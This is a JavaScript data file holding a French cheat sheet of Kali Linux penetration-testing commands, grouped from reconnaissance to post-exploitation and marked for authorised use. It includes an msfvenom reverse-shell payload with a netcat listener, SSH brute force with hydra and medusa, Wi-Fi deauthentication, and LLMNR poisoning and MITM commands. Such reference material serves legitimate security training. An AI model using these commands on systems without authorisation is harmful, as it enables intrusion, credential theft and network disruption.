// Aide-mémoire des commandes Kali Linux — usage éthique et autorisé uniquement.
// Chaque entrée : { tool, desc, cmd }
window.KALI_DATA = [
  {
    cat: "Système & bases Kali",
    icon: "🐧",
    desc: "Mise à jour, gestion des paquets, services",
    items: [
      { tool: "apt update", desc: "Mettre à jour la liste des paquets", cmd: "sudo apt update && sudo apt full-upgrade -y" },
      { tool: "apt install", desc: "Installer un outil", cmd: "sudo apt install <paquet>" },
      { tool: "kali-tweaks", desc: "Configurer Kali (shells, réseau, métapaquets)", cmd: "sudo kali-tweaks" },
      { tool: "systemctl", desc: "Gérer un service (ex. ssh)", cmd: "sudo systemctl start ssh && sudo systemctl status ssh" },
      { tool: "service", desc: "Lancer/arrêter un service", cmd: "sudo service postgresql start" },
      { tool: "msfdb", desc: "Initialiser la base de Metasploit", cmd: "sudo msfdb init" },
      { tool: "whoami / id", desc: "Vérifier l'utilisateur et les privilèges", cmd: "id" },
      { tool: "uname", desc: "Version du noyau et de l'OS", cmd: "uname -a" }
    ]
  },
  {
    cat: "Reconnaissance & OSINT",
    icon: "🔍",
    desc: "Collecte d'informations passive et active",
    items: [
      { tool: "whois", desc: "Informations d'enregistrement d'un domaine", cmd: "whois exemple.com" },
      { tool: "dig", desc: "Requêtes DNS détaillées", cmd: "dig exemple.com ANY +noall +answer" },
      { tool: "host", desc: "Résolution DNS rapide", cmd: "host -a exemple.com" },
      { tool: "dnsrecon", desc: "Énumération DNS (transfert de zone, brute)", cmd: "dnsrecon -d exemple.com" },
      { tool: "dnsenum", desc: "Énumération DNS complète", cmd: "dnsenum exemple.com" },
      { tool: "theHarvester", desc: "Emails, sous-domaines, hôtes (OSINT)", cmd: "theHarvester -d exemple.com -b all" },
      { tool: "sublist3r", desc: "Énumération de sous-domaines", cmd: "sublist3r -d exemple.com" },
      { tool: "fierce", desc: "Reconnaissance DNS", cmd: "fierce --domain exemple.com" },
      { tool: "recon-ng", desc: "Framework de reconnaissance modulaire", cmd: "recon-ng" },
      { tool: "maltego", desc: "Analyse de liens et OSINT graphique", cmd: "maltego" }
    ]
  },
  {
    cat: "Scan réseau & ports",
    icon: "📡",
    desc: "Découverte d'hôtes et de services",
    items: [
      { tool: "nmap", desc: "Scan de ports basique", cmd: "nmap -sV -sC <cible>" },
      { tool: "nmap", desc: "Scan complet de tous les ports", cmd: "nmap -p- -T4 <cible>" },
      { tool: "nmap", desc: "Détection d'OS et scripts NSE", cmd: "sudo nmap -A -O <cible>" },
      { tool: "nmap", desc: "Découverte d'hôtes (ping sweep)", cmd: "nmap -sn 192.168.1.0/24" },
      { tool: "masscan", desc: "Scan de ports très rapide", cmd: "sudo masscan <cible>/24 -p1-65535 --rate=1000" },
      { tool: "netdiscover", desc: "Découverte ARP sur le réseau local", cmd: "sudo netdiscover -r 192.168.1.0/24" },
      { tool: "arp-scan", desc: "Scan ARP du réseau local", cmd: "sudo arp-scan --localnet" },
      { tool: "rustscan", desc: "Scan de ports ultra-rapide", cmd: "rustscan -a <cible> -- -sV" }
    ]
  },
  {
    cat: "Web — énumération & scan",
    icon: "🌐",
    desc: "Applications et serveurs web",
    items: [
      { tool: "gobuster", desc: "Brute-force de répertoires web", cmd: "gobuster dir -u http://<cible> -w /usr/share/wordlists/dirb/common.txt" },
      { tool: "gobuster", desc: "Énumération de sous-domaines (vhost)", cmd: "gobuster vhost -u http://<cible> -w <wordlist>" },
      { tool: "ffuf", desc: "Fuzzing web rapide", cmd: "ffuf -u http://<cible>/FUZZ -w /usr/share/wordlists/dirb/common.txt" },
      { tool: "dirb", desc: "Scanner de contenu web", cmd: "dirb http://<cible>" },
      { tool: "nikto", desc: "Scanner de vulnérabilités web", cmd: "nikto -h http://<cible>" },
      { tool: "whatweb", desc: "Empreinte des technologies web", cmd: "whatweb http://<cible>" },
      { tool: "wpscan", desc: "Scan de sécurité WordPress", cmd: "wpscan --url http://<cible> --enumerate u" },
      { tool: "sqlmap", desc: "Détection/exploitation d'injections SQL", cmd: "sqlmap -u \"http://<cible>/page?id=1\" --batch --dbs" },
      { tool: "wfuzz", desc: "Fuzzing de paramètres web", cmd: "wfuzz -c -z file,<wordlist> http://<cible>/FUZZ" },
      { tool: "burpsuite", desc: "Proxy d'interception web", cmd: "burpsuite" }
    ]
  },
  {
    cat: "Analyse de vulnérabilités",
    icon: "🛡️",
    desc: "Détection de failles",
    items: [
      { tool: "nmap NSE", desc: "Scripts de détection de vulnérabilités", cmd: "nmap --script vuln <cible>" },
      { tool: "searchsploit", desc: "Rechercher un exploit connu", cmd: "searchsploit apache 2.4" },
      { tool: "nuclei", desc: "Scan de vulnérabilités par templates", cmd: "nuclei -u http://<cible>" },
      { tool: "openvas / gvm", desc: "Scanner de vulnérabilités complet", cmd: "sudo gvm-setup && sudo gvm-start" }
    ]
  },
  {
    cat: "Exploitation",
    icon: "💥",
    desc: "Frameworks et exploitation (labs autorisés)",
    items: [
      { tool: "msfconsole", desc: "Lancer Metasploit", cmd: "msfconsole" },
      { tool: "msfvenom", desc: "Générer un payload de test", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf" },
      { tool: "searchsploit -m", desc: "Copier un exploit localement", cmd: "searchsploit -m <chemin/exploit>" },
      { tool: "netcat", desc: "Écouteur pour reverse shell", cmd: "nc -lvnp 4444" }
    ]
  },
  {
    cat: "Mots de passe & hachages",
    icon: "🔑",
    desc: "Cassage de mots de passe (comptes autorisés)",
    items: [
      { tool: "hydra", desc: "Brute-force de service (ex. SSH)", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<cible>" },
      { tool: "john", desc: "Cassage de hachages (John the Ripper)", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
      { tool: "hashcat", desc: "Cassage GPU (ex. MD5 mode 0)", cmd: "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt" },
      { tool: "hash-identifier", desc: "Identifier un type de hachage", cmd: "hash-identifier" },
      { tool: "hashid", desc: "Identifier un hachage", cmd: "hashid <hash>" },
      { tool: "medusa", desc: "Brute-force parallèle", cmd: "medusa -h <cible> -u admin -P rockyou.txt -M ssh" },
      { tool: "crunch", desc: "Générer une wordlist", cmd: "crunch 6 8 abc123 -o wordlist.txt" }
    ]
  },
  {
    cat: "Wi-Fi & sans-fil",
    icon: "📶",
    desc: "Audit de réseaux sans-fil (vos propres réseaux)",
    items: [
      { tool: "airmon-ng", desc: "Passer la carte en mode monitor", cmd: "sudo airmon-ng start wlan0" },
      { tool: "airodump-ng", desc: "Capturer le trafic Wi-Fi", cmd: "sudo airodump-ng wlan0mon" },
      { tool: "aireplay-ng", desc: "Injection / désauthentification (test)", cmd: "sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon" },
      { tool: "aircrack-ng", desc: "Casser une capture WPA (autorisée)", cmd: "aircrack-ng -w rockyou.txt capture.cap" },
      { tool: "wifite", desc: "Audit Wi-Fi automatisé", cmd: "sudo wifite" }
    ]
  },
  {
    cat: "Sniffing & MITM",
    icon: "🕵️",
    desc: "Analyse de trafic (réseau autorisé)",
    items: [
      { tool: "wireshark", desc: "Analyseur de paquets graphique", cmd: "wireshark" },
      { tool: "tcpdump", desc: "Capture de paquets en ligne de commande", cmd: "sudo tcpdump -i eth0 -w capture.pcap" },
      { tool: "ettercap", desc: "MITM et sniffing", cmd: "sudo ettercap -T -i eth0" },
      { tool: "bettercap", desc: "Framework MITM moderne", cmd: "sudo bettercap -iface eth0" },
      { tool: "responder", desc: "Empoisonnement LLMNR/NBT-NS (lab)", cmd: "sudo responder -I eth0" }
    ]
  },
  {
    cat: "Post-exploitation & privesc",
    icon: "⬆️",
    desc: "Escalade de privilèges et énumération locale",
    items: [
      { tool: "linpeas", desc: "Énumération d'escalade Linux", cmd: "./linpeas.sh" },
      { tool: "sudo -l", desc: "Lister les droits sudo", cmd: "sudo -l" },
      { tool: "find SUID", desc: "Chercher les binaires SUID", cmd: "find / -perm -4000 -type f 2>/dev/null" },
      { tool: "python shell", desc: "Stabiliser un shell", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" }
    ]
  },
  {
    cat: "Forensics & stéganographie",
    icon: "🔬",
    desc: "Analyse et récupération",
    items: [
      { tool: "binwalk", desc: "Analyser/extraire un firmware ou fichier", cmd: "binwalk -e fichier.bin" },
      { tool: "steghide", desc: "Extraire des données cachées", cmd: "steghide extract -sf image.jpg" },
      { tool: "exiftool", desc: "Lire les métadonnées", cmd: "exiftool image.jpg" },
      { tool: "foremost", desc: "Récupérer des fichiers", cmd: "foremost -i disk.img -o sortie/" },
      { tool: "strings", desc: "Extraire les chaînes lisibles", cmd: "strings fichier.bin | less" }
    ]
  }
];
